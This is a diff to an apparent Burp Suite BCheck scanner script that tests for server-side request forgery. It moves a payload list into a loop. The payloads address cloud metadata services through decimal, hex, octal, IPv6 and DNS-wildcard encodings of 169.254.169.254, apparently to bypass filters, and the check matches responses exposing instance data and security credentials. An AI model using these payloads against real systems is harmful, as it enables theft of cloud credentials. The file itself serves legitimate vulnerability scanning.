@@ -5,20 +5,21 @@ metadata:
     author: "BCheck Arsenal"
     tags: "ssrf", "cloud", "metadata", "waf-bypass"
 
+run for each:
+    payload = "http://169.254.169.254/latest/meta-data/",
+        "http://2852039166/latest/meta-data/",
+        "http://0xA9FEA9FE/latest/meta-data/",
+        "http://0251.0376.0251.0376/latest/meta-data/",
+        "http://[::ffff:169.254.169.254]/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254.nip.io/latest/meta-data/"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "http://169.254.169.254/latest/meta-data/"
-            - "http://2852039166/latest/meta-data/"
-            - "http://0xA9FEA9FE/latest/meta-data/"
-            - "http://0251.0376.0251.0376/latest/meta-data/"
-            - "http://[::ffff:169.254.169.254]/latest/meta-data/"
-            - "http://metadata.google.internal/computeMetadata/v1/"
-            - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-            - "http://169.254.169.254.nip.io/latest/meta-data/"
+        replacing: {payload}
 
-    if {check.response} matches "(ami-id|instance-id|iam/|computeMetadata|azEnvironment|local-ipv4|security-credentials)" then
+    if {latest.response} matches "(ami-id|instance-id|iam/|computeMetadata|azEnvironment|local-ipv4|security-credentials)" then
         report issue:
             severity: high
             confidence: certain
